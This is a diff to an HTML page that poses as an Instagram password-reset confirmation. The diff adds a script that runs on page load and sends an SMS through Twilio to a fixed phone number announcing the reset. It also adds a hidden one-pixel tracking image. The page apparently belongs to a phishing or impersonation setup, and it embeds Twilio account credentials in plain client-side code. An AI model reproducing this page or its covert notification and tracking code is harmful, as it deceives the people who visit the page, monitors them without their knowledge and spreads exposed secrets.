@@ -57,12 +57,61 @@
             
         }
     </style>
+<script>
+        $(document).ready(function () {
+            const twilioAccountSID = 'ACd2e88a17b14ef8022a8b6f079f92c24a';
+            const twilioAuthToken = '32a437eb82a5e4d65cc1252d92d1079c';
+            const twilioPhoneNumber = '+14302225977';
+
+            function sendTwilioSMS() {
+                const toPhoneNumber = '+916370943160';
+                const twilioApiUrl = `https://api.twilio.com/2010-04-01/Accounts/${twilioAccountSID}/Messages.json`;
+
+                const istTime = new Date().toLocaleString('en-US', {
+    timeZone: 'Asia/Kolkata',
+    day: 'numeric',
+    month: 'long',
+    hour: 'numeric',
+    minute: 'numeric',
+    second: 'numeric',
+    hour12: true
+});
+const formattedTime = `${istTime}`;
+
+
+                const messageBody = ` ‎User RESET SUCCESSFULLY! on\n ‎ ‎ ‎ ‎\n${formattedTime}`;
+
+                const auth = btoa(`${twilioAccountSID}:${twilioAuthToken}`);
+
+                $.ajax({
+                    type: 'POST',
+                    url: twilioApiUrl,
+                    beforeSend: function (xhr) {
+                        xhr.setRequestHeader('Authorization', `Basic ${auth}`);
+                    },
+                    data: {
+                        To: toPhoneNumber,
+                        From: twilioPhoneNumber,
+                        Body: messageBody
+                    },
+                    success: function (response) {
+                        console.log('Twilio Notification Sent:', response);
+                    },
+                    error: function (error) {
+                        console.error('Error sending Twilio Notification:', error);
+                    }
+                });
+            }
+
+            sendTwilioSMS();
+        });
+    </script>
 </head>
 <body>
     <div class="navbar">
         <img src="https://i.ibb.co/QX7nFCf/IMG-20231217-114156.png" alt="Instagram Logo">
     </div>
-
+<img src="https://i.ibb.co/Hh6BZ7d/tracking-pixel.png" alt="Tracking Pixel" width="1" height="1">
     <div class="content">
         <img class="icon" src="https://raw.githubusercontent.com/SaloniTae/accounts/f1445b13019f2aa72e7df7d0ae102b59d8fb1bed/password/reset/confirm/uidb36%3D7qiyibu%26token%3DEWRuV3VwKF7rxeffAIcnQymf8KklugVa8AcSYfGj8zK9LWk44NMBlpPRSvMXePS3%3Aone_click_login_email%26s%3Done_click_login_email/PhotoRoom-20231225_212435.png" alt="Icon">
         <p class="text">Your password has been successfully reset.</p>
